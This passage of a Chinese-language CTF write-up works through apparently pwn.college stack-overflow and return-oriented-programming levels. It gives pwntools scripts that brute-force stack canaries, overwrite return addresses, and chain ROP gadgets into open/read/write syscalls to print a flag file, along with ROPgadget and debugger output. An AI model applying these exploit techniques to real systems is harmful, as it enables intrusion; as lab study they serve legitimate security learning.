<h4 id="level14-1-1"><a href="#level14-1-1" class="headerlink" title="level14.1"></a>level14.1</h4><p>通过gdb调试出input_buf和残留canary之间的偏移：<code>0x7ffe2b972e38 - 0x7ffe2b972da0  </code></p>
<p>即0x98，再+1即覆盖低位00能够泄露。然后脚本依然是上面那个，改改偏移即可。</p>
<h4 id="level15-0-1"><a href="#level15-0-1" class="headerlink" title="level15.0"></a>level15.0</h4><p>这道题我就直接按照不会给stack来做了。所以，直接IDA打开，查看偏移地址。然后直接开始爆破就行。需要爆破Canary以及ret_addr的倒数第二个字节。exp：</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">from pwn <span class="hljs-keyword">import</span> *<br># context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br># p = gdb.debug(<span class="hljs-string">&#x27;/challenge/babymem-level-9-1&#x27;</span>, <span class="hljs-string">&#x27;b challenge&#x27;</span>)<br>x = <span class="hljs-number">0x01</span><br>tmp = b<span class="hljs-string">&#x27;&#x27;</span><br>canary = p8(<span class="hljs-number">0x00</span>)<br>length = [b<span class="hljs-string">&#x27;122&#x27;</span>,b<span class="hljs-string">&#x27;123&#x27;</span>, b<span class="hljs-string">&#x27;124&#x27;</span>, b<span class="hljs-string">&#x27;125&#x27;</span>, b<span class="hljs-string">&#x27;126&#x27;</span>, b<span class="hljs-string">&#x27;127&#x27;</span>, b<span class="hljs-string">&#x27;128&#x27;</span>]<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> True:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    payload = b<span class="hljs-string">&#x27;&#x27;</span><br>    payload += length[i]<br>    p.sendlineafter(b<span class="hljs-string">&#x27;ize: &#x27;</span>, payload)<br>    padding = b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">120</span><br>    tmp = canary<br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    print(payload)<br>    p.sendafter(b<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>, payload)<br>    <span class="hljs-keyword">out</span> = p.recvall()<br>    # print(<span class="hljs-keyword">out</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;terminated&#x27;</span> not <span class="hljs-keyword">in</span> <span class="hljs-keyword">out</span>:<br>        canary += y<br>        <span class="hljs-keyword">if</span> len(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        i += <span class="hljs-number">1</span><br>        x = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">continue</span><br>print(<span class="hljs-string">&quot;canary:&quot;</span>, canary)<br>x = <span class="hljs-number">0x01</span><br><span class="hljs-keyword">while</span> True:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    payload = b<span class="hljs-string">&#x27;138&#x27;</span><br>    p.sendlineafter(b<span class="hljs-string">&#x27;ize: &#x27;</span>, payload)<br>    padding = b<span class="hljs-string">&#x27;a&#x27;</span> *<span class="hljs-number">120</span><br>    payload = padding + canary + b<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p8(<span class="hljs-number">0x95</span>) + p8(x)<br>    x +=<span class="hljs-number">1</span><br>    p.sendafter(b<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>, payload)<br>    <span class="hljs-keyword">out</span> = p.recvall()<br>    p.close()<br>    print(<span class="hljs-keyword">out</span>)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">out</span>:<br>        <span class="hljs-keyword">break</span><br>print(<span class="hljs-keyword">out</span>)<br><br></code></pre></td></tr></table></figure>

<p>这exp写的挺丑陋的O.o…那就再说一下思路吧：</p>
<blockquote>
<p>canary需要爆破，那么最低字节为0x00不用动，然后因为程序会根据canary是否被修改而反馈，所以依据反馈来判断当前覆盖的字节是否是canary的值。因此可以爆破出canary。（其次的原因是因为fork会继承父进程的canary，这个yan在视频里讲了就不赘述）</p>
<p>然后IDA打开，查看我们输入的buf的偏移（这里要注意，不是IDA打开的buf变量，因为buf在后面被赋值了一个变量，那个变量的偏移才是需要的偏移。）最后爆破ret_addr的倒数第二个字节就行了。</p>
</blockquote>
<h4 id="level15-1-1"><a href="#level15-1-1" class="headerlink" title="level15.1"></a>level15.1</h4><p>同15.1，只需要修改偏移地址而已。</p>
<h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h3><p>一条用得很多的找gadgets的方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ROPgadget --binary rop --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span><br></code></pre></td></tr></table></figure>



<h4 id="level1-0-1"><a href="#level1-0-1" class="headerlink" title="level1.0"></a>level1.0</h4><p>简单的栈溢出，直接覆盖返回地址为win函数地址即可。</p>
<h4 id="level1-1-1"><a href="#level1-1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>win():<code>0x4019e7</code>，buf:<code>0x7ffc739ba520</code>，rbp:<code>0x7ffc739ba540</code></p>
<p>padding：<code>0x20 + 8</code></p>
<h4 id="level2-0-1"><a href="#level2-0-1" class="headerlink" title="level2.0"></a>level2.0</h4><p>win_stage_1():<code>0x401cbe</code></p>
<p>win_stage_2():<code>0x401d6b</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level2.0&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(<span class="hljs-number">0x401cbe</span>) + p64(<span class="hljs-number">0x401d6b</span>)<br>p.send(payload)<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>

<h4 id="level2-1-1"><a href="#level2-1-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>input_buf: <code>0x7fffca103c80</code>, rbp: <code>0x7fffca103cb0</code></p>
<p>padding &#x3D; 0xb0 - 0x80 + 8&#x3D; 0x38</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; <span class="hljs-keyword">b </span>win_stage_1<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">2</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x401a4a</span><br>pwndbg&gt; <span class="hljs-keyword">b </span>win_stage_2<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">3</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x401af7</span><br></code></pre></td></tr></table></figure>

<h4 id="level3-0-1"><a href="#level3-0-1" class="headerlink" title="level3.0"></a>level3.0</h4><p>padding &#x3D; 0x40+ 8 &#x3D; 0x48</p>
<p>题目要求：stage1需要把参数设置为1，stage2需要把参数设置为2以此类推，总共五个stage。那么我们需要找到<code>pop rsi; ret</code>。用ROPgadget试试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level3-0:/challenge$ ROPgadget --binary ./babyrop_level3.0 --only <span class="hljs-string">&#x27;ret|pop&#x27;</span> | grep <span class="hljs-string">&#x27;rdi&#x27;</span><br>0x0000000000402663 : pop rdi ; ret<br></code></pre></td></tr></table></figure>

<p>那就很简单了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level3.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span><br>stage_1 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x401fd6</span>)<br>stage_2 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x40227b</span>)<br>stage_3 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x3</span>) + p64(<span class="hljs-number">0x401ef4</span>)<br>stage_4 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x402195</span>)<br>stage_5 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x5</span>) + p64(<span class="hljs-number">0x4020b2</span>)<br><br>payload = padding + stage_1 + stage_2 + stage_3 + stage_4 + stage_5<br>pause()<br>p.send(payload)<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>

<h4 id="level3-1-1"><a href="#level3-1-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>buf: <code>0x7ffe2d71b370</code>, rbp: <code>0x7ffe2d71b3c0</code>, padding &#x3D; <code>0xc0 - 0x70 + 8 </code> &#x3D; <code>0x58</code> </p>
<p>gadget：<code>0x0000000000402093</code></p>
<h4 id="level4-0-2"><a href="#level4-0-2" class="headerlink" title="level4.0"></a>level4.0</h4><blockquote>
<p><strong>ASLR和PIE</strong></p>
<p>PIE(Position-Independent Executable)是一种编译选项，使得可执行文件可以在内存任意位置运行，代码不是固定地址。工作原理：1. 使用相对地址而非绝对地址。2. 编译器生成位置无关代码，链接器生成可执行文件。 3. 加载时确定实际地址，并进行重新定位。</p>
<p>ASLR(Address Space Layout Randomization)是一种安全技术，通过随机化进程内存布局（如栈、堆、共享库等）的地址，增加攻击者预测内存地址的难度，从而放至缓冲区溢出等攻击。工作原理：1. 随机化对象：栈、堆、共享库、内存映射等。2. 操作系统在加载程序时，随机化各内存区域的基址。3. 随机化粒度：通常以内存页（如4KB）为单位。</p>
<p>ASLR是操作系统层面的技术，随机化内存布局。PIE是编译和链接层面的技术，生成与位置无关的代码。PIE使ASLR更有效，ASLR为PIE提供随机化支持。</p>
</blockquote>
<p>这题开启了ASLR。但是它给了一个[leak]，也就是把buf的地址给我们了。然后没有win函数，得自己构造了。由于之前shellcode那一章已经是很早之前做的了，有点不记得了。直接看一下shellcode的level1就行。然后就是ROPgadget找对应的指令就行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rdi&#x27;</span><br>0x00000000004026c6 : pop rdi ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rsi&#x27;</span><br>0x0000000000402981 : pop rsi ; pop r15 ; ret<br>0x00000000004026ae : pop rsi ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rax&#x27;</span><br>0x0000000000402697 : pop rax ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;syscall&quot;</span><br>Gadgets information<br>============================================================<br>0x00000000004026b6 : syscall<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdx&quot;</span><br>0x00000000004026a7 : pop rdx ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;r10&quot;</span><br>0x00000000004026a6 : pop r10 ; ret<br></code></pre></td></tr></table></figure>

<p>啥都有，IDA打开算一下padding：<code>0x60 + 8</code>&#x3D;0x68。被以前的自己所恶心了一下。以前写shellcode level1的时候图方便用的sendfile作为第二个系统调用。但是这里是不支持sendfile的，找不到这个系统调用号。因此还是得用<code>open</code>+<code>read</code>+<code>write</code>三兄弟。然后有两点值得注意：1. 经过之前的题目，很容易猜测open后的flag的fd大概率为3。2. flag的长度为0x39</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;/challenge/babyrop_level4.0&quot;</span>)<br><span class="hljs-attribute">padding</span> = b&#x27;/flag&#x27;+ p8(<span class="hljs-number">0</span>x00) + b&#x27;a&#x27;*<span class="hljs-number">0</span>x62<br><span class="hljs-attribute">p</span>.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)<br><span class="hljs-attribute">buf_addr</span> = p.recv(<span class="hljs-number">14</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;buf_addr:&quot;</span>, buf_addr)<br><span class="hljs-attribute">buf_addr</span> = p64(int(buf_addr.decode(&#x27;utf-<span class="hljs-number">8</span>&#x27;)[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>))<br><span class="hljs-attribute">pop_rdi</span> = p64(<span class="hljs-number">0</span>x4026c6)<br><span class="hljs-attribute">pop_rsi</span> = p64(<span class="hljs-number">0</span>x4026ae)<br><span class="hljs-attribute">pop_rax</span> = p64(<span class="hljs-number">0</span>x402697)<br><span class="hljs-attribute">syscall</span> = p64(<span class="hljs-number">0</span>x4026b6)<br><span class="hljs-attribute">pop_rdx</span> = p64(<span class="hljs-number">0</span>x4026a7)<br><span class="hljs-attribute">pop_r10</span> = p64(<span class="hljs-number">0</span>x4026a6)<br><span class="hljs-attribute">open_sys</span> = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0</span>x0) + pop_rax + p64(<span class="hljs-number">0</span>x2) + syscall<br><span class="hljs-attribute">read_sys</span> = pop_rax + p64(<span class="hljs-number">0</span>x0) + pop_rdi + p64(<span class="hljs-number">0</span>x3) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">1024</span>) + syscall<br><span class="hljs-attribute">write_sys</span> = pop_rdx + p64(<span class="hljs-number">0</span>x39) + pop_rax + p64(<span class="hljs-number">1</span>) + pop_rdi + p64(<span class="hljs-number">1</span>) + pop_rsi + buf_addr + syscall<br><span class="hljs-attribute">payload</span> = padding + open_sys + read_sys + write_sys<br><span class="hljs-comment"># pause()</span><br><span class="hljs-attribute">p</span>.send(payload)<br><br><span class="hljs-attribute">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>



<h4 id="level4-1-2"><a href="#level4-1-2" class="headerlink" title="level4.1"></a>level4.1</h4><p>两件事：1. 换gadgets的地址。2. 算padding</p>
<p>即可拿到flag</p>
<h4 id="level5-0-2"><a href="#level5-0-2" class="headerlink" title="level5.0"></a>level5.0</h4><p>这题没有leak了，所以不知道栈的地址。但是上一题的exp中，栈地址是为了存储”&#x2F;flag”字符串以及存储读出来的flag。那么可以写入其他可读可写的空间。用IDA pro打开，可以看到哪些字段是可写的段。选这些段的地址即可存储flag。然后为了把”&#x2F;flag”字符串写入到程序中，因此需要额外调用一个read来接收stdin，stdin就是”&#x2F;flag”。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level5.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span><br><span class="hljs-comment"># p.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)</span><br><span class="hljs-comment"># buf_addr = p.recv(14)</span><br><span class="hljs-comment"># print(&quot;buf_addr:&quot;, buf_addr)</span><br><span class="hljs-comment"># buf_addr = p64(int(buf_addr.decode(&#x27;utf-8&#x27;)[2:], 16))</span><br>buf_addr = p64(<span class="hljs-number">0x405090</span>)<br>pop_rdi = p64(<span class="hljs-number">0x00000000004026df</span>)<br>pop_rsi = p64(<span class="hljs-number">0x00000000004026ff</span>)<br>pop_rax = p64(<span class="hljs-number">0x00000000004026e8</span>)<br>syscall = p64(<span class="hljs-number">0x000000000040270f</span>)<br>pop_rdx = p64(<span class="hljs-number">0x00000000004026f0</span>)<br>open_sys = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0x0</span>) + pop_rax + p64(<span class="hljs-number">0x2</span>) + syscall<br>read_sys = pop_rax + p64(<span class="hljs-number">0x0</span>) + pop_rdi + p64(<span class="hljs-number">0x3</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">1024</span>) + syscall<br>write_sys = pop_rdx + p64(<span class="hljs-number">0x39</span>) + pop_rax + p64(<span class="hljs-number">1</span>) + pop_rdi + p64(<span class="hljs-number">1</span>) + pop_rsi + buf_addr + syscall<br>read_stdin = pop_rax + p64(<span class="hljs-number">0x0</span>) + pop_rdi + p64(<span class="hljs-number">0</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">0x6</span>) + syscall<br>payload = padding + read_stdin + open_sys + read_sys + write_sys<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + p8(<span class="hljs-number">0x00</span>))<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>

<h4 id="level5-1-2"><a href="#level5-1-2" class="headerlink" title="level5.1"></a>level5.1</h4><p>查看可读可写段：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; vmmap<br><span class="hljs-attribute">LEGEND</span>: STACK | HEAP | CODE | DATA | RWX | RODATA<br>             <span class="hljs-attribute">Start</span>                End Perm     Size Offset File<br>          <span class="hljs-attribute">0x400000</span>           <span class="hljs-number">0</span>x401000 r--p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x401000</span>           <span class="hljs-number">0</span>x402000 r-xp     <span class="hljs-number">1000</span>   <span class="hljs-number">1000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x402000</span>           <span class="hljs-number">0</span>x403000 r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">2000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x403000</span>           <span class="hljs-number">0</span>x404000 r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">2000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x404000</span>           <span class="hljs-number">0</span>x405000 rw-p     <span class="hljs-number">1000</span>   <span class="hljs-number">3000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>         <span class="hljs-attribute">0x17fc000</span>          <span class="hljs-number">0</span>x181d000 rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [heap]</span><br>    <span class="hljs-attribute">0x7897c231d000</span>     <span class="hljs-number">0</span>x7897c233f000 r--p    <span class="hljs-number">22000</span>      <span class="hljs-number">0</span> /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c233f000</span>     <span class="hljs-number">0</span>x7897c24b7000 r-xp   <span class="hljs-number">178000</span>  <span class="hljs-number">22000</span> /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c24b7000</span>     <span class="hljs-number">0</span>x7897c2505000 r--p    <span class="hljs-number">4</span>e000 <span class="hljs-number">19</span>a000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2505000</span>     <span class="hljs-number">0</span>x7897c2509000 r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>e7000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2509000</span>     <span class="hljs-number">0</span>x7897c250b000 rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>eb000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c250b000</span>     <span class="hljs-number">0</span>x7897c2511000 rw-p     <span class="hljs-number">6000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [anon_7897c250b]</span><br>    <span class="hljs-attribute">0x7897c2520000</span>     <span class="hljs-number">0</span>x7897c2521000 r--p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2521000</span>     <span class="hljs-number">0</span>x7897c2544000 r-xp    <span class="hljs-number">23000</span>   <span class="hljs-number">1000</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2544000</span>     <span class="hljs-number">0</span>x7897c254c000 r--p     <span class="hljs-number">8000</span>  <span class="hljs-number">24000</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254d000</span>     <span class="hljs-number">0</span>x7897c254e000 r--p     <span class="hljs-number">1000</span>  <span class="hljs-number">2</span>c000 /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254e000</span>     <span class="hljs-number">0</span>x7897c254f000 rw-p     <span class="hljs-number">1000</span>  <span class="hljs-number">2</span>d000 /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254f000</span>     <span class="hljs-number">0</span>x7897c2550000 rw-p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [anon_7897c254f]</span><br>    <span class="hljs-attribute">0x7fff1a68e000</span>     <span class="hljs-number">0</span>x7fff1a6af000 rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [stack]</span><br>    <span class="hljs-attribute">0x7fff1a7e9000</span>     <span class="hljs-number">0</span>x7fff1a7ed000 r--p     <span class="hljs-number">4000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vvar]</span><br>    <span class="hljs-attribute">0x7fff1a7ed000</span>     <span class="hljs-number">0</span>x7fff1a7ef000 r-xp     <span class="hljs-number">2000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vdso]</span><br><span class="hljs-attribute">0xffffffffff600000</span> <span class="hljs-number">0</span>xffffffffff601000 --xp     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vsyscall]</span><br></code></pre></td></tr></table></figure>

<p>查看gadget：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rax&quot;</span><br>0x0000000000401bc7 : pop rax ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdx&quot;</span><br>0x0000000000401bef : pop rdx ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdi&quot;</span><br>0x0000000000401bd7 : pop rdi ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rsi&quot;</span><br>0x0000000000401d61 : pop rsi ; pop r15 ; ret<br>0x0000000000401bcf : pop rsi ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;syscall&quot;</span><br>Gadgets information<br>============================================================<br>0x0000000000401bdf : syscall<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure>



<h4 id="level6-0-1"><a href="#level6-0-1" class="headerlink" title="level6.0"></a>level6.0</h4><p>没有syscall gadget了。但是在IDA中看到了以下函数：</p>
